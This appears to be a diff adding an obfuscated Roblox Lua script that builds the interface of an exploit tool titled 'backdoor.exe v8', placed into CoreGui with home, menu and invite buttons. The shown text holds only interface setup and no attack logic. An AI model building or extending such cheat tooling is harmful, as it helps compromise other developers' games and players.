@@ -1,0 +1,2405 @@
+local fd4hh21cgefg = {
+	dh712eh636 = Instance.new("ScreenGui"),
+	dd9b25856344cgg0 = Instance.new("Frame"),
+	cac046cga17a448h976g91c9f5 = Instance.new("ImageLabel"),
+	d4af2dfce9ed86 = Instance.new("Frame"),
+	h7b4e9cb = Instance.new("UIListLayout"),
+	d12g2fbg99a0h23 = Instance.new("ImageLabel"),
+	h2c38g7747bhh7d0g715g6hd95eh = Instance.new("TextButton"),
+	afeae21ac2gd = Instance.new("ImageLabel"),
+	e2fad5g1hcf554 = Instance.new("ModuleScript"),
+	c6d9ag = Instance.new("Frame"),
+	hff965953e86c0595a8025c56hg833 = Instance.new("TextLabel"),
+	h0d4c350dbe = Instance.new("TextButton"),
+	e58a4h0685611735dg0014e8e = Instance.new("ImageLabel"),
+	e12083ae8aecd017gca3b2h4c72 = Instance.new("Folder"),
+	h4a0e3eg7 = Instance.new("Frame"),
+	e01d48a = Instance.new("Frame"),
+	e7ebh7007e5a5b89e86d6ebdea27gdc5 = Instance.new("Frame"),
+	e0g1b5ddhfdcg68d117518 = Instance.new("UIListLayout"),
+	d879ebb051d333685 = Instance.new("ImageLabel"),
+	g5eb3da4f7d1gbba5ffg7c = Instance.new("ImageLabel"),
+	daf29a7hag700ggf = Instance.new("TextButton"),
+	g3ch8a3ee7h020c8f1gce54h9a9h0c4 = Instance.new("TextLabel"),
+	db986e41d71ch3b32d7e662f = Instance.new("Frame"),
+	h3737ebh7bb = Instance.new("ImageLabel"),
+	g5cea4chgc845e25g552 = Instance.new("TextButton"),
+	d5a5d6de7b8h948e70523c9 = Instance.new("ImageLabel"),
+	bb263 = Instance.new("TextButton"),
+	cb14416d4545f7 = Instance.new("ImageLabel"),
+	f7fhb8c3f9fa89afd05hh0h7e4ff8e25 = Instance.new("TextButton"),
+	a5334e = Instance.new("ImageButton"),
+	f92d0ca = Instance.new("UICorner"),
+	cbe8abe5g3 = Instance.new("Frame"),
+	h42155205e75hccg1g9a = Instance.new("ImageLabel"),
+	ehd26ehd9cc4h0d6h3be87590dg4a = Instance.new("Folder"),
+	b3890fg63ce4h67g8h1f9eh37 = Instance.new("Frame"),
+	hfb3f = Instance.new("Frame"),
+	d4884ed51742h20a622f46232eb24 = Instance.new("Frame"),
+	h4hgg4bd4ec4a488074f032 = Instance.new("ImageLabel"),
+	h6853acg6g79de6265b9 = Instance.new("ScrollingFrame"),
+	a5f31c34e2bb2e5ef23gb677fac9 = Instance.new("ScrollingFrame"),
+	d42688a6beffe2g7g3a = Instance.new("TextBox"),
+	g111gg077dce = Instance.new("TextLabel"),
+	d0b173ed5dh667d38a87cc = Instance.new("Frame"),
+	ha17c6ede7db7164f09825ad2b1ha = Instance.new("ModuleScript"),
+	h94ee = Instance.new("ModuleScript"),
+	bg8ebgc06c9d0g7f0022d4e5a36 = Instance.new("ModuleScript"),
+	aa7c8e6322g549af4g02a6g357e051 = Instance.new("ModuleScript"),
+	h20h7ha0 = Instance.new("ImageLabel"),
+	fe9bg29b77270164gg = Instance.new("ScrollingFrame"),
+	b85hhfacbag9bb2g5fgc67f6aege = Instance.new("UIListLayout"),
+	ed18305a7c7 = Instance.new("ImageLabel"),
+	e8f0e10bc8 = Instance.new("ImageLabel"),
+	adah1868686e0564f791bdb6 = Instance.new("TextButton"),
+	hg3ab0h09fdc = Instance.new("TextLabel"),
+	h1abc42ggh9813haa30e534 = Instance.new("ImageButton"),
+	h57c2ag73 = Instance.new("ImageLabel"),
+	c9cd7613117fgd0dabd80519 = Instance.new("TextBox"),
+	hc6h6d4cff8c893g5ef = Instance.new("ImageLabel"),
+	e8110575g2a1cc8d2he7g17ehb17 = Instance.new("Frame"),
+	c56fb09a7h2gbh3df79e5bdg = Instance.new("UIListLayout"),
+	g92h4fef4ed09b910agh873he9232b = Instance.new("ImageButton"),
+	g08g669ha2d3g7cb5 = Instance.new("ImageButton"),
+	c547f0gd = Instance.new("TextButton"),
+	ag6hfe170cbg9gc55b5bg6 = Instance.new("TextButton"),
+	d74df2fa2fedc486ef9aagec7c744a5 = Instance.new("ImageButton"),
+	g424469e37 = Instance.new("ImageButton"),
+	gaf8c5320a118g763fga5dbe564e3551 = Instance.new("TextButton"),
+	hbh59 = Instance.new("TextButton"),
+	a0c39934h6 = Instance.new("ImageButton"),
+	c31ghdc95dge715d640ec = Instance.new("ImageButton"),
+	gehd1h0 = Instance.new("TextButton"),
+	fe98182bg71hf = Instance.new("TextButton"),
+	df293hg76d3a = Instance.new("ImageButton"),
+	fb7449ed = Instance.new("ImageButton"),
+	e1ag4ff3653750e2f9h5a = Instance.new("TextButton"),
+	dc024acaf4fh009 = Instance.new("TextButton"),
+	c6ecd7af8h1 = Instance.new("ImageButton"),
+	c5cga42585c14137f86acf53a286e2f = Instance.new("ImageButton"),
+	h41ch80c0h = Instance.new("TextButton"),
+	c044h28a6e9305d7f14631fb = Instance.new("TextButton"),
+	fe8460e7f58bc3hdee4ebcd71b = Instance.new("ScrollingFrame"),
+	hfdg0d8111a1h = Instance.new("UIListLayout"),
+	bgd0h0e840g603dd91g152ea = Instance.new("ImageButton"),
+	g9g6080bba3f1b7a2h2d8e20939 = Instance.new("TextButton"),
+	eh97e0d900g0bff9c175 = Instance.new("ImageButton"),
+	b40429ec = Instance.new("TextButton"),
+	ggc6fcd3d = Instance.new("TextButton"),
+	be09744044h184197acddbf1346271 = Instance.new("TextButton"),
+	f75bbh633515e2090e0e1dg82e8f = Instance.new("ImageLabel"),
+	a033ee89g2ea79heb14ff8829 = Instance.new("Frame"),
+	e08f9hbg05153f6319 = Instance.new("TextLabel"),
+	bfg18bf5231d9be1e88a6agbd77f543 = Instance.new("ScrollingFrame"),
+	de8c6chce4aag4fd350666aca681 = Instance.new("UIListLayout"),
+	ec96edb61a6fcd98d = Instance.new("Frame"),
+	af8104b6 = Instance.new("UICorner"),
+	e98d7ddgc9f75151c0 = Instance.new("ImageLabel"),
+	ffg64b989fe9ac = Instance.new("UICorner"),
+	haf845b3ag1g1b1d94ae78a = Instance.new("Frame"),
+	ha97ee0ffe9053f = Instance.new("UIGradient"),
+	cb26ch = Instance.new("UIGradient"),
+	f51gfd = Instance.new("TextLabel"),
+	f35e12ga7f2bd9d7690h155d35 = Instance.new("TextLabel"),
+	gfab241360hfba0edf1b5a2 = Instance.new("TextLabel"),
+	d9e152a7gf3691e764fcd1gec33ag = Instance.new("Frame"),
+	ec4fab9cdaa0aeaahf8b143ee27ee = Instance.new("UICorner"),
+	f73600bb0218606 = Instance.new("Frame"),
+	abda22gf1226eeh = Instance.new("UIGradient"),
+	e2e0a4hf5f0 = Instance.new("ImageLabel"),
+	g096205d9d0h924e7d80bf49g36b77f = Instance.new("TextButton"),
+	ha8ge55h60df3 = Instance.new("TextLabel"),
+	c4ff0d98fef1cef8199de995a5 = Instance.new("ImageLabel"),
+	c160dba83922b10b0h = Instance.new("Folder"),
+	chcfe5cah6d5f2366e = Instance.new("Frame"),
+	g6d0c3904a6fgfe = Instance.new("Frame"),
+	fg68dafgh7ad5afh = Instance.new("Frame"),
+	gc4f56000 = Instance.new("TextLabel"),
+	d93c98493f3d1a6df0beef793233 = Instance.new("ScrollingFrame"),
+	dhd70d336b188dga2 = Instance.new("UIListLayout"),
+	dggb4h6f8d = Instance.new("Frame"),
+	de6ha024b4bb499 = Instance.new("UICorner"),
+	h85497db6b68 = Instance.new("TextLabel"),
+	fe500d3d5agb86740h = Instance.new("TextButton"),
+	f0f32e11a60fc99 = Instance.new("UICorner"),
+	d76c582cb5ebb6cfg4f5061394a6e = Instance.new("TextButton"),
+	ea5g5fa9 = Instance.new("UICorner"),
+	bg8f08623b8g89h3caaf06b8cba = Instance.new("ImageLabel"),
+	ac4g6h1h6724ed2 = Instance.new("TextButton"),
+	g91edcg3dde18c2e422 = Instance.new("ImageLabel"),
+	bc1364h610f7g4 = Instance.new("ModuleScript"),
+	a84bcb407943e85d2d6c4h8c = Instance.new("TextLabel"),
+	f7c8b = Instance.new("ModuleScript"),
+	bdg82eb087b994cc8f41cc05c96991gf = Instance.new("ModuleScript"),
+	e71g255d0bg08121df = Instance.new("ModuleScript"),
+	dff162750fe3331 = Instance.new("ModuleScript"),
+	be647bb6120b7ca116hhc = Instance.new("ModuleScript"),
+	ac3d2h2b73h4ffe980he48e7 = Instance.new("ModuleScript"),
+	dfba8h23554c36gh63720337 = Instance.new("ModuleScript"),
+	c0e78eg483dcda4c0ddfhd0bcdgbdh = Instance.new("ModuleScript"),
+};
+
+fd4hh21cgefg.dh712eh636.Name = "backdoor.exe v8";
+fd4hh21cgefg.dh712eh636.Parent = game:GetService("CoreGui");
+
+fd4hh21cgefg.dd9b25856344cgg0.Name = "Main";
+fd4hh21cgefg.dd9b25856344cgg0.ZIndex = -1;
+fd4hh21cgefg.dd9b25856344cgg0.Size = UDim2.new(0, 611, 0, 352);
+fd4hh21cgefg.dd9b25856344cgg0.ClipsDescendants = true;
+fd4hh21cgefg.dd9b25856344cgg0.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.dd9b25856344cgg0.BorderSizePixel = 0;
+fd4hh21cgefg.dd9b25856344cgg0.Position = UDim2.new(0.200000003, 0, 0.100000001, 0);
+fd4hh21cgefg.dd9b25856344cgg0.BackgroundColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.dd9b25856344cgg0.Parent = fd4hh21cgefg.dh712eh636;
+
+fd4hh21cgefg.cac046cga17a448h976g91c9f5.Name = "Topbar";
+fd4hh21cgefg.cac046cga17a448h976g91c9f5.Size = UDim2.new(1, 0, 0, 29);
+fd4hh21cgefg.cac046cga17a448h976g91c9f5.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.cac046cga17a448h976g91c9f5.BackgroundTransparency = 1;
+fd4hh21cgefg.cac046cga17a448h976g91c9f5.BackgroundColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.cac046cga17a448h976g91c9f5.ImageColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.cac046cga17a448h976g91c9f5.ScaleType = Enum.ScaleType.Slice;
+fd4hh21cgefg.cac046cga17a448h976g91c9f5.SliceScale = 0.029999999329447746;
+fd4hh21cgefg.cac046cga17a448h976g91c9f5.Image = "rbxassetid://3570695787";
+fd4hh21cgefg.cac046cga17a448h976g91c9f5.ImageContent = Content;
+fd4hh21cgefg.cac046cga17a448h976g91c9f5.SliceCenter = Rect.new(Vector2.new(100, 100), Vector2.new(100, 100));
+fd4hh21cgefg.cac046cga17a448h976g91c9f5.Parent = fd4hh21cgefg.dd9b25856344cgg0;
+
+fd4hh21cgefg.d4af2dfce9ed86.Name = "RightOutline";
+fd4hh21cgefg.d4af2dfce9ed86.AnchorPoint = Vector2.new(1, 0.5);
+fd4hh21cgefg.d4af2dfce9ed86.ZIndex = 3;
+fd4hh21cgefg.d4af2dfce9ed86.Size = UDim2.new(1, 0, 0, 31);
+fd4hh21cgefg.d4af2dfce9ed86.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.d4af2dfce9ed86.BackgroundTransparency = 1;
+fd4hh21cgefg.d4af2dfce9ed86.Position = UDim2.new(1, -10, 0.5, 0);
+fd4hh21cgefg.d4af2dfce9ed86.BackgroundColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.d4af2dfce9ed86.Parent = fd4hh21cgefg.cac046cga17a448h976g91c9f5;
+
+fd4hh21cgefg.h7b4e9cb.Name = "UIListLayout";
+fd4hh21cgefg.h7b4e9cb.Padding = UDim.new(0, 5);
+fd4hh21cgefg.h7b4e9cb.Parent = fd4hh21cgefg.d4af2dfce9ed86;
+
+fd4hh21cgefg.d12g2fbg99a0h23.Name = "ImageLabel";
+fd4hh21cgefg.d12g2fbg99a0h23.Size = UDim2.new(0, 14, 0, 14);
+fd4hh21cgefg.d12g2fbg99a0h23.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.d12g2fbg99a0h23.BackgroundTransparency = 1;
+fd4hh21cgefg.d12g2fbg99a0h23.BackgroundColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.d12g2fbg99a0h23.ImageColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.d12g2fbg99a0h23.Image = "rbxassetid://4467776646";
+fd4hh21cgefg.d12g2fbg99a0h23.ImageContent = Content;
+fd4hh21cgefg.d12g2fbg99a0h23.Parent = fd4hh21cgefg.d4af2dfce9ed86;
+
+fd4hh21cgefg.h2c38g7747bhh7d0g715g6hd95eh.Name = "Hitbox";
+fd4hh21cgefg.h2c38g7747bhh7d0g715g6hd95eh.AutoButtonColor = true;
+fd4hh21cgefg.h2c38g7747bhh7d0g715g6hd95eh.Size = UDim2.new(1, 0, 1, 0);
+fd4hh21cgefg.h2c38g7747bhh7d0g715g6hd95eh.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.h2c38g7747bhh7d0g715g6hd95eh.BackgroundTransparency = 1;
+fd4hh21cgefg.h2c38g7747bhh7d0g715g6hd95eh.BackgroundColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.h2c38g7747bhh7d0g715g6hd95eh.TextColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.h2c38g7747bhh7d0g715g6hd95eh.Text = "";
+fd4hh21cgefg.h2c38g7747bhh7d0g715g6hd95eh.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+fd4hh21cgefg.h2c38g7747bhh7d0g715g6hd95eh.TextTransparency = 1;
+fd4hh21cgefg.h2c38g7747bhh7d0g715g6hd95eh.Parent = fd4hh21cgefg.d12g2fbg99a0h23;
+
+fd4hh21cgefg.afeae21ac2gd.Name = "icon";
+fd4hh21cgefg.afeae21ac2gd.Size = UDim2.new(1, 0, 1, 0);
+fd4hh21cgefg.afeae21ac2gd.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.afeae21ac2gd.BackgroundTransparency = 1;
+fd4hh21cgefg.afeae21ac2gd.BackgroundColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.afeae21ac2gd.ImageColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.afeae21ac2gd.Image = "rbxassetid://5768110591";
+fd4hh21cgefg.afeae21ac2gd.ImageContent = Content;
+fd4hh21cgefg.afeae21ac2gd.Parent = fd4hh21cgefg.d12g2fbg99a0h23;
+
+fd4hh21cgefg.e2fad5g1hcf554.Name = "toggler";
+fd4hh21cgefg.e2fad5g1hcf554.Parent = fd4hh21cgefg.d12g2fbg99a0h23;
+
+fd4hh21cgefg.c6d9ag.Name = "Frame";
+fd4hh21cgefg.c6d9ag.AnchorPoint = Vector2.new(0.5, 1);
+fd4hh21cgefg.c6d9ag.Size = UDim2.new(1, 0, 0, 3);
+fd4hh21cgefg.c6d9ag.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.c6d9ag.BorderSizePixel = 0;
+fd4hh21cgefg.c6d9ag.Position = UDim2.new(0.501051903, 0, 1, 0);
+fd4hh21cgefg.c6d9ag.BackgroundColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.c6d9ag.Parent = fd4hh21cgefg.cac046cga17a448h976g91c9f5;
+
+fd4hh21cgefg.hff965953e86c0595a8025c56hg833.Name = "VersionTitle";
+fd4hh21cgefg.hff965953e86c0595a8025c56hg833.AnchorPoint = Vector2.new(0.5, 0.5);
+fd4hh21cgefg.hff965953e86c0595a8025c56hg833.Size = UDim2.new(1, 0, 0.633000016, 0);
+fd4hh21cgefg.hff965953e86c0595a8025c56hg833.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.hff965953e86c0595a8025c56hg833.BackgroundTransparency = 1;
+fd4hh21cgefg.hff965953e86c0595a8025c56hg833.Position = UDim2.new(0.5, 0, 0.5, 0);
+fd4hh21cgefg.hff965953e86c0595a8025c56hg833.BackgroundColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.hff965953e86c0595a8025c56hg833.TextColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.hff965953e86c0595a8025c56hg833.Text = "backdoor.exe - v8.0.0 Fixed by Crypted";
+fd4hh21cgefg.hff965953e86c0595a8025c56hg833.FontFace = Font.new("rbxasset://fonts/families/Roboto.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+fd4hh21cgefg.hff965953e86c0595a8025c56hg833.TextWrapped = true;
+fd4hh21cgefg.hff965953e86c0595a8025c56hg833.TextScaled = true;
+fd4hh21cgefg.hff965953e86c0595a8025c56hg833.Parent = fd4hh21cgefg.cac046cga17a448h976g91c9f5;
+
+fd4hh21cgefg.h0d4c350dbe.Name = "Hitbox";
+fd4hh21cgefg.h0d4c350dbe.AutoButtonColor = true;
+fd4hh21cgefg.h0d4c350dbe.Size = UDim2.new(1, 0, 1, 0);
+fd4hh21cgefg.h0d4c350dbe.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.h0d4c350dbe.BackgroundTransparency = 1;
+fd4hh21cgefg.h0d4c350dbe.BackgroundColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.h0d4c350dbe.TextColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.h0d4c350dbe.Text = "";
+fd4hh21cgefg.h0d4c350dbe.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+fd4hh21cgefg.h0d4c350dbe.TextTransparency = 1;
+fd4hh21cgefg.h0d4c350dbe.Parent = fd4hh21cgefg.cac046cga17a448h976g91c9f5;
+
+fd4hh21cgefg.e58a4h0685611735dg0014e8e.Name = "Sidebar";
+fd4hh21cgefg.e58a4h0685611735dg0014e8e.Size = UDim2.new(0, 43, 1, -32);
+fd4hh21cgefg.e58a4h0685611735dg0014e8e.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.e58a4h0685611735dg0014e8e.BackgroundTransparency = 1;
+fd4hh21cgefg.e58a4h0685611735dg0014e8e.Position = UDim2.new(0, 0, 0, 32);
+fd4hh21cgefg.e58a4h0685611735dg0014e8e.BackgroundColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.e58a4h0685611735dg0014e8e.ImageColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.e58a4h0685611735dg0014e8e.ScaleType = Enum.ScaleType.Slice;
+fd4hh21cgefg.e58a4h0685611735dg0014e8e.SliceScale = 0.029999999329447746;
+fd4hh21cgefg.e58a4h0685611735dg0014e8e.Image = "rbxassetid://3570695787";
+fd4hh21cgefg.e58a4h0685611735dg0014e8e.ImageContent = Content;
+fd4hh21cgefg.e58a4h0685611735dg0014e8e.SliceCenter = Rect.new(Vector2.new(100, 100), Vector2.new(100, 100));
+fd4hh21cgefg.e58a4h0685611735dg0014e8e.Parent = fd4hh21cgefg.dd9b25856344cgg0;
+
+fd4hh21cgefg.e12083ae8aecd017gca3b2h4c72.Name = "Borders";
+fd4hh21cgefg.e12083ae8aecd017gca3b2h4c72.Parent = fd4hh21cgefg.e58a4h0685611735dg0014e8e;
+
+fd4hh21cgefg.h4a0e3eg7.Name = "Frame";
+fd4hh21cgefg.h4a0e3eg7.AnchorPoint = Vector2.new(0.5, 0);
+fd4hh21cgefg.h4a0e3eg7.Size = UDim2.new(0, 10, 0, 313);
+fd4hh21cgefg.h4a0e3eg7.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.h4a0e3eg7.BorderSizePixel = 0;
+fd4hh21cgefg.h4a0e3eg7.Position = UDim2.new(0.724836469, 0, 0, 0);
+fd4hh21cgefg.h4a0e3eg7.BackgroundColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.h4a0e3eg7.Parent = fd4hh21cgefg.e12083ae8aecd017gca3b2h4c72;
+
+fd4hh21cgefg.e01d48a.Name = "Frame";
+fd4hh21cgefg.e01d48a.AnchorPoint = Vector2.new(0.5, 0);
+fd4hh21cgefg.e01d48a.Size = UDim2.new(0, 22, 0, 6);
+fd4hh21cgefg.e01d48a.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.e01d48a.BorderSizePixel = 0;
+fd4hh21cgefg.e01d48a.Position = UDim2.new(0.744186044, 0, 0, 0);
+fd4hh21cgefg.e01d48a.BackgroundColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.e01d48a.Parent = fd4hh21cgefg.e12083ae8aecd017gca3b2h4c72;
+
+fd4hh21cgefg.e7ebh7007e5a5b89e86d6ebdea27gdc5.Name = "Bottom";
+fd4hh21cgefg.e7ebh7007e5a5b89e86d6ebdea27gdc5.AnchorPoint = Vector2.new(0.5, 1);
+fd4hh21cgefg.e7ebh7007e5a5b89e86d6ebdea27gdc5.Size = UDim2.new(0, 43, 0, 142);
+fd4hh21cgefg.e7ebh7007e5a5b89e86d6ebdea27gdc5.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.e7ebh7007e5a5b89e86d6ebdea27gdc5.BackgroundTransparency = 1;
+fd4hh21cgefg.e7ebh7007e5a5b89e86d6ebdea27gdc5.Position = UDim2.new(0.5, 0, 1, -6);
+fd4hh21cgefg.e7ebh7007e5a5b89e86d6ebdea27gdc5.BackgroundColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.e7ebh7007e5a5b89e86d6ebdea27gdc5.Parent = fd4hh21cgefg.e58a4h0685611735dg0014e8e;
+
+fd4hh21cgefg.e0g1b5ddhfdcg68d117518.Name = "UIListLayout";
+fd4hh21cgefg.e0g1b5ddhfdcg68d117518.Padding = UDim.new(0, 10);
+fd4hh21cgefg.e0g1b5ddhfdcg68d117518.Parent = fd4hh21cgefg.e7ebh7007e5a5b89e86d6ebdea27gdc5;
+
+fd4hh21cgefg.d879ebb051d333685.Name = "InviteBtn";
+fd4hh21cgefg.d879ebb051d333685.Size = UDim2.new(0, 28, 0, 28);
+fd4hh21cgefg.d879ebb051d333685.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.d879ebb051d333685.BackgroundTransparency = 1;
+fd4hh21cgefg.d879ebb051d333685.BackgroundColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.d879ebb051d333685.ImageColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.d879ebb051d333685.Image = "rbxassetid://3570695787";
+fd4hh21cgefg.d879ebb051d333685.ImageContent = Content;
+fd4hh21cgefg.d879ebb051d333685.Parent = fd4hh21cgefg.e7ebh7007e5a5b89e86d6ebdea27gdc5;
+
+fd4hh21cgefg.g5eb3da4f7d1gbba5ffg7c.Name = "ImageLabel";
+fd4hh21cgefg.g5eb3da4f7d1gbba5ffg7c.AnchorPoint = Vector2.new(0.5, 0.5);
+fd4hh21cgefg.g5eb3da4f7d1gbba5ffg7c.Size = UDim2.new(0.72299999, 0, 0.72299999, 0);
+fd4hh21cgefg.g5eb3da4f7d1gbba5ffg7c.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.g5eb3da4f7d1gbba5ffg7c.BackgroundTransparency = 1;
+fd4hh21cgefg.g5eb3da4f7d1gbba5ffg7c.Position = UDim2.new(0.5, 0, 0.5, 0);
+fd4hh21cgefg.g5eb3da4f7d1gbba5ffg7c.BackgroundColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.g5eb3da4f7d1gbba5ffg7c.ImageColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.g5eb3da4f7d1gbba5ffg7c.ScaleType = Enum.ScaleType.Fit;
+fd4hh21cgefg.g5eb3da4f7d1gbba5ffg7c.Image = "rbxassetid://4503342956";
+fd4hh21cgefg.g5eb3da4f7d1gbba5ffg7c.ImageContent = Content;
+fd4hh21cgefg.g5eb3da4f7d1gbba5ffg7c.Parent = fd4hh21cgefg.d879ebb051d333685;
+
+fd4hh21cgefg.daf29a7hag700ggf.Name = "Hitbox";
+fd4hh21cgefg.daf29a7hag700ggf.AutoButtonColor = true;
+fd4hh21cgefg.daf29a7hag700ggf.Size = UDim2.new(1, 0, 1, 0);
+fd4hh21cgefg.daf29a7hag700ggf.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.daf29a7hag700ggf.BackgroundTransparency = 1;
+fd4hh21cgefg.daf29a7hag700ggf.BackgroundColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.daf29a7hag700ggf.TextColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.daf29a7hag700ggf.Text = "";
+fd4hh21cgefg.daf29a7hag700ggf.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+fd4hh21cgefg.daf29a7hag700ggf.TextTransparency = 1;
+fd4hh21cgefg.daf29a7hag700ggf.Parent = fd4hh21cgefg.d879ebb051d333685;
+
+fd4hh21cgefg.g3ch8a3ee7h020c8f1gce54h9a9h0c4.Name = "CharCounter";
+fd4hh21cgefg.g3ch8a3ee7h020c8f1gce54h9a9h0c4.AnchorPoint = Vector2.new(0.5, 0);
+fd4hh21cgefg.g3ch8a3ee7h020c8f1gce54h9a9h0c4.Size = UDim2.new(1, 0, 0, 40);
+fd4hh21cgefg.g3ch8a3ee7h020c8f1gce54h9a9h0c4.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.g3ch8a3ee7h020c8f1gce54h9a9h0c4.BackgroundTransparency = 1;
+fd4hh21cgefg.g3ch8a3ee7h020c8f1gce54h9a9h0c4.BackgroundColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.g3ch8a3ee7h020c8f1gce54h9a9h0c4.TextColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.g3ch8a3ee7h020c8f1gce54h9a9h0c4.Text = "0";
+fd4hh21cgefg.g3ch8a3ee7h020c8f1gce54h9a9h0c4.FontFace = Font.new("rbxasset://fonts/families/Ubuntu.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+fd4hh21cgefg.g3ch8a3ee7h020c8f1gce54h9a9h0c4.TextWrapped = true;
+fd4hh21cgefg.g3ch8a3ee7h020c8f1gce54h9a9h0c4.Parent = fd4hh21cgefg.e7ebh7007e5a5b89e86d6ebdea27gdc5;
+
+fd4hh21cgefg.db986e41d71ch3b32d7e662f.Name = "Top";
+fd4hh21cgefg.db986e41d71ch3b32d7e662f.AnchorPoint = Vector2.new(0.5, 0);
+fd4hh21cgefg.db986e41d71ch3b32d7e662f.ZIndex = 3;
+fd4hh21cgefg.db986e41d71ch3b32d7e662f.Size = UDim2.new(0, 43, 0, 141);
+fd4hh21cgefg.db986e41d71ch3b32d7e662f.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.db986e41d71ch3b32d7e662f.BorderSizePixel = 0;
+fd4hh21cgefg.db986e41d71ch3b32d7e662f.BackgroundTransparency = 1;
+fd4hh21cgefg.db986e41d71ch3b32d7e662f.Position = UDim2.new(0.508065999, 0, 0.0479233228, 0);
+fd4hh21cgefg.db986e41d71ch3b32d7e662f.BackgroundColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.db986e41d71ch3b32d7e662f.Parent = fd4hh21cgefg.e58a4h0685611735dg0014e8e;
+
+fd4hh21cgefg.h3737ebh7bb.Name = "HomeBtn";
+fd4hh21cgefg.h3737ebh7bb.AnchorPoint = Vector2.new(0.5, 0.5);
+fd4hh21cgefg.h3737ebh7bb.Size = UDim2.new(0, 20, 0, 20);
+fd4hh21cgefg.h3737ebh7bb.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.h3737ebh7bb.BackgroundTransparency = 1;
+fd4hh21cgefg.h3737ebh7bb.Position = UDim2.new(0.5, 0, 0, 5);
+fd4hh21cgefg.h3737ebh7bb.BackgroundColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.h3737ebh7bb.ImageColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.h3737ebh7bb.ScaleType = Enum.ScaleType.Fit;
+fd4hh21cgefg.h3737ebh7bb.Image = "rbxassetid://4370345144";
+fd4hh21cgefg.h3737ebh7bb.ImageContent = Content;
+fd4hh21cgefg.h3737ebh7bb.Parent = fd4hh21cgefg.db986e41d71ch3b32d7e662f;
+
+fd4hh21cgefg.g5cea4chgc845e25g552.Name = "Hitbox";
+fd4hh21cgefg.g5cea4chgc845e25g552.AutoButtonColor = true;
+fd4hh21cgefg.g5cea4chgc845e25g552.Size = UDim2.new(1, 0, 1, 0);
+fd4hh21cgefg.g5cea4chgc845e25g552.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.g5cea4chgc845e25g552.BackgroundTransparency = 1;
+fd4hh21cgefg.g5cea4chgc845e25g552.BackgroundColor3 = Color3.new(1, 1, 1);
+fd4hh21cgefg.g5cea4chgc845e25g552.TextColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.g5cea4chgc845e25g552.Text = "";
+fd4hh21cgefg.g5cea4chgc845e25g552.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+fd4hh21cgefg.g5cea4chgc845e25g552.TextTransparency = 1;
+fd4hh21cgefg.g5cea4chgc845e25g552.Parent = fd4hh21cgefg.h3737ebh7bb;
+
+fd4hh21cgefg.d5a5d6de7b8h948e70523c9.Name = "MenuBtn";
+fd4hh21cgefg.d5a5d6de7b8h948e70523c9.AnchorPoint = Vector2.new(0.5, 0.5);
+fd4hh21cgefg.d5a5d6de7b8h948e70523c9.Size = UDim2.new(0, 20, 0, 20);
+fd4hh21cgefg.d5a5d6de7b8h948e70523c9.BorderColor3 = Color3.new(0, 0, 0);
+fd4hh21cgefg.d5a5d6de7b8h948e70523c9.BackgroundTransparency = 1;
